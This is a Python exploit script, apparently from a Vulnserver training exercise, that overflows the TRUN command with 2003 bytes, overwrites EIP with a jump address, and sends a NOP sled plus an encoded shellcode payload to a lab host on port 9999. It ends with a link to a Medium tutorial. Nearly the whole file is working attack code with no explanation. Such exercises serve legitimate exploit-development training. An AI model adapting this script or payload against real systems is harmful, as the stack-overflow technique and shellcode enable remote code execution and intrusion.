#!/usr/bin/python\xee"

import socket

overflow = "TRUN /.:/"

overflow += "A" * 2003

#buf += "BBBB"

eip = "\xA0\x12\x50\x62"

nop = "\x90" * 10

buf =  b""
buf += b"\xdb\xc8\xd9\x74\x24\xf4\x5d\xb8\x0e\xf6\x0f\x94"
buf += b"\x2b\xc9\xb1\x59\x31\x45\x19\x83\xed\xfc\x03\x45"
buf += b"\x15\xec\x03\xf3\x7c\x7f\xeb\x0c\x7d\x1f\x65\xe9"
buf += b"\x4c\x0d\x11\x79\xfc\x81\x51\x2f\x0d\x6a\x37\xc4"
buf += b"\x86\x1e\x90\xd5\x67\xd1\x57\x5f\xbe\xdc\x57\xcc"
buf += b"\x82\x7f\x24\x0f\xd7\x5f\x15\xc0\x2a\x9e\x52\x96"
buf += b"\x41\x4f\x0e\x7e\x21\xdd\xbf\x0b\x77\xdd\xbe\xdb"
buf += b"\xf3\x5d\xb9\x5e\xc3\x29\x75\x60\x14\x5a\xdd\x42"
buf += b"\x1f\x14\xc6\xd2\x1e\x77\x73\x1b\x54\x4b\x35\xad"
buf += b"\x6a\x38\xf1\x46\x95\xe8\xcb\x98\x57\xdb\x21\xb5"
buf += b"\x59\x24\x01\x25\x2c\x5e\x71\xd8\x37\xa5\x0b\x06"
buf += b"\xbd\x39\xab\xcd\x65\x9d\x4d\x01\xf3\x56\x41\xee"
buf += b"\x77\x30\x46\xf1\x54\x4b\x72\x7a\x5b\x9b\xf2\x38"
buf += b"\x78\x3f\x5e\x9a\xe1\x66\x3a\x4d\x1d\x78\xe2\x32"
buf += b"\xbb\xf3\x01\x24\xbb\xfc\xd9\x49\xe1\x6a\x15\x84"
buf += b"\x1a\x6a\x31\x9f\x69\x58\x9e\x0b\xe6\xd0\x57\x92"
buf += b"\xf1\x61\x7f\x25\x2d\xc9\x10\xdb\xce\x29\x38\x18"
buf += b"\x9a\x79\x52\x89\xa3\x12\xa2\x36\x76\x8e\xa8\xa0"
buf += b"\x73\x7c\xb0\xb9\xec\x82\xca\xa8\xb0\x0b\x2c\x9a"
buf += b"\x18\x5b\xe1\x5b\xc9\x1b\x51\x34\x03\x94\x8e\x24"
buf += b"\x2c\x7f\xa7\xcf\xc3\x29\x9f\x67\x7d\x70\x6b\x19"
buf += b"\x82\xaf\x11\x19\x08\x45\xe5\xd4\xf9\x2c\xf5\x01"
buf += b"\x9e\xce\x05\xd2\x0b\xce\x6f\xd6\x9d\x99\x07\xd4"
buf += b"\xf8\xed\x87\x27\x2f\x6e\xcf\xd8\xae\x46\xbb\xef"
buf += b"\x24\xe6\xd3\x0f\xa9\xe6\x23\x46\xa3\xe6\x4b\x3e"
buf += b"\x97\xb5\x6e\x41\x02\xaa\x22\xd4\xad\x9a\x97\x7f"
buf += b"\xc6\x20\xc1\x48\x49\xdb\x24\xcb\x8e\x23\xba\xe4"
buf += b"\x36\x4b\x44\xb5\xc6\x8b\x2e\x35\x97\xe3\xa5\x1a"
buf += b"\x18\xc3\x46\xb1\x71\x4b\xcc\x54\x33\xea\xd1\x7c"
buf += b"\x95\xb2\xd2\x73\x0e\x45\xa8\xfc\xb1\xa6\x4d\x15"
buf += b"\xd6\xa7\x4d\x19\xe8\x94\x9b\x20\x9e\xdb\x1f\x17"
buf += b"\x91\x6e\x3d\x3e\x38\x90\x11\x40\x69"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.150.245", 9999))

print s.recv(1024)

s.send(overflow + eip + nop + buf)

print s.recv(1024)

s.close()

https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
